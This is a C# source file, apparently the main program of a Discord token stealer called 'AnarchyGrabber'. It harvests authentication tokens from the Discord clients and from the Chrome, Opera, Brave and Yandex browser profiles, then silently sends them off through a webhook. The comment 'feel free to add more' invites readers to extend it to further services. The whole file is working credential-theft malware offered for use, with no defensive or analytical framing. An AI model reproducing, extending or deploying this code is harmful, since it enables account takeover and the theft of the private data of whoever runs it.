using System.Collections.Generic;

namespace AnarchyGrabber
{
    class Program
    {
        static void Main(string[] args)
        {
            List<string> report = new List<string>();

            //attempt to get tokens from the different services (feel free to add more)
            report.Add("**Discord**");
            report.AddRange(Grabber.GetTokens(@"Roaming\Discord"));
            report.Add("**Discord PTB**");
            report.AddRange(Grabber.GetTokens(@"Roaming\discordptb"));
            report.Add("\n**Discord Canary**");
            report.AddRange(Grabber.GetTokens(@"Roaming\discordcanary", true));
            report.Add("\n**Google Chrome**");
            report.AddRange(Grabber.GetTokens(@"Local\Google\Chrome\User Data\Default"));
            report.Add("\n**Opera**");
            report.AddRange(Grabber.GetTokens(@"Roaming\Opera Software\Opera Stable", true));
            report.Add("\n**Brave**");
            report.AddRange(Grabber.GetTokens(@"Local\BraveSoftware\Brave-Browser\User Data\Default", true));
            report.Add("\n**Yandex**");
            report.AddRange(Grabber.GetTokens(@"Local\Yandex\YandexBrowser\User Data\Default", true));

            if (Grabber.TokensFound)
            {
                //attempts to report the tokens to the user
                try
                {
                    Webhook.ReportTokens(report);
                }
                catch { }
            }
        }
    }
}
